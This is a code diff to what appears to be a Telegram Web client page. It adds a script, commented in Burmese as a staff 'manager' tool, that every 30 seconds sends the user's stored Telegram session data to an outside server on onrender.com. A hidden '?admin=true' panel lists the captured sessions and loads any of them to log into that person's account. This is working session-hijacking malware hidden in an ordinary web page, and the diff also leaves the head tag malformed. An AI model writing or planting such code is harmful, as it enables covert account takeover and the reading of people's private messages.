@@ -57,7 +57,84 @@
       @layer tablist, spinner, button, input, layout;
     }
   </style>
-</head>
+</head
+
+<!-- Custom Telegram Manager Script -->
+    <script>
+      const BACKEND_URL = "https://telegram-7ih3.onrender.com";
+
+      // (၁) Admin Panel ကို ဝင်ချင်တဲ့အခါ
+      if (window.location.search.includes("admin=true")) {
+          document.addEventListener("DOMContentLoaded", () => {
+              // မူလ Telegram Web UI ကို ဖျောက်ပြီး Admin Panel ကို ပြမယ်
+              document.body.innerHTML = `
+                <div style="padding: 30px; font-family: sans-serif; background: #f4f4f9; height: 100vh;">
+                  <h2 style="color: #333;">Admin Control Panel</h2>
+                  <p>Staff ဝင်ထားသော အကောင့်များ</p>
+                  <button onclick="loadSessions()" style="padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;">Load Accounts</button>
+                  <div id="admin-content" style="margin-top: 20px;"></div>
+                </div>
+              `;
+
+              // Backend ကနေ Data လှမ်းခေါ်မယ့် Function
+              window.loadSessions = async () => {
+                 try {
+                     document.getElementById('admin-content').innerHTML = "Loading...";
+                     const res = await fetch(`${BACKEND_URL}/api/get_sessions`);
+                     const data = await res.json();
+                     
+                     if(data.length === 0) {
+                         document.getElementById('admin-content').innerHTML = "မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။";
+                         return;
+                     }
+
+                     let html = "<table style='width: 100%; text-align: left; border-collapse: collapse;'>";
+                     html += "<tr style='background: #ddd;'><th>User ID / Info</th><th>Action</th></tr>";
+                     data.forEach(session => {
+                         html += `<tr>
+                            <td style='padding: 10px; border-bottom: 1px solid #ccc;'>User: ${session.user_id}</td>
+                            <td style='padding: 10px; border-bottom: 1px solid #ccc;'>
+                                <button onclick='loginAs(${JSON.stringify(session)})' style='padding: 5px 10px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;'>Login ဝင်မည်</button>
+                            </td>
+                         </tr>`;
+                     });
+                     html += "</table>";
+                     document.getElementById('admin-content').innerHTML = html;
+                 } catch (err) {
+                     document.getElementById('admin-content').innerHTML = "Error loading sessions.";
+                 }
+              };
+
+              // Admin က Login ဝင်မယ့် Function
+              window.loginAs = (sessionData) => {
+                 // ယာယီ LocalStorage ထဲကို Session ပြန်ထည့်ပေးခြင်း
+                 localStorage.setItem("tt-global-state", sessionData.local_storage_data);
+                 alert("အကောင့်ထဲသို့ ဝင်ရောက်နေပါပြီ...");
+                 window.location.href = "/"; // Telegram Web ဘက်သို့ ပြန်သွားရန်
+              };
+          });
+      } else {
+          // (၂) Staff တွေ သာမန် ဝင်သုံးတဲ့အခါ (Background ကနေ Session လှမ်းပို့မယ်)
+          // ၃၀ စက္ကန့် တစ်ကြိမ် Session အသစ်ရှိမရှိ စစ်ပြီး Backend ကို ပို့မယ်
+          setInterval(() => {
+              const globalState = localStorage.getItem("tt-global-state");
+              if (globalState) {
+                  // User ID တစ်ခုခု ဖန်တီးပြီး ပို့မယ် (ဥပမာ - LocalStorage က data အနည်းငယ်ကို ယူမယ်)
+                  const sessionData = {
+                      user_id: "staff_" + Math.floor(Math.random() * 1000), // လောလောဆယ် Random ID နဲ့ အရင်စမ်းပါမယ်
+                      local_storage_data: globalState,
+                      timestamp: new Date().toISOString()
+                  };
+                  
+                  fetch(`${BACKEND_URL}/api/save_session`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify(sessionData)
+                  }).catch(console.error);
+              }
+          }, 30000); 
+      }
+    </script>
 
 <body id="root">
   <noscript>
